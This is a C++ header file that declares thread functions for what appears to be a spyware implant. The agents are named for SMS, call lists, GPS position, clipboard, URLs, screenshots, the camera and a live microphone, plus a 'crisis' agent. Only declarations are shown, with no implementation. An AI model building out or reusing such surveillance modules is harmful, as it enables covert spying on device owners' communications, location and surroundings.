#include "Common.h"
#include "Log.h"
#include "GPS.h"
#include "Cell.h"
#include "Process.h"
#include "Observer.h"
#include <exception>
using namespace std;

#ifndef __Agents_h__
#define __Agents_h__

#define AGENT_COMMON_DATA(x) 	\
	UINT MyID = x; \
	Status *statusObj = Status::self(); \
	pAgentStruct MyData = (pAgentStruct)lpParam;

DWORD WINAPI SmsAgent(LPVOID lpParam);
DWORD WINAPI OrganizerAgent(LPVOID lpParam);
DWORD WINAPI CallListAgent(LPVOID lpParam);
DWORD WINAPI DeviceInfoAgent(LPVOID lpParam);
DWORD WINAPI PositionAgent(LPVOID lpParam);
DWORD WINAPI ClipboardAgent(LPVOID lpParam);
DWORD WINAPI UrlAgent(LPVOID lpParam);
DWORD WINAPI CrisisAgent(LPVOID lpParam);
DWORD WINAPI CallAgent(LPVOID lpParam);
DWORD WINAPI SnapshotAgent(LPVOID lpParam);
DWORD WINAPI CameraAgent(LPVOID lpParam);
DWORD WINAPI ApplicationAgent(LPVOID lpParam);
DWORD WINAPI LiveMicAgent(LPVOID lpParam);

BOOL AgentSleep(UINT Id, UINT uMillisec);
void FAR PASCAL lineCallbackFunc(DWORD hDevice, DWORD dwMsg, DWORD dwCallbackInstance, DWORD dwParam1, DWORD dwParam2, DWORD dwParam3);
#endif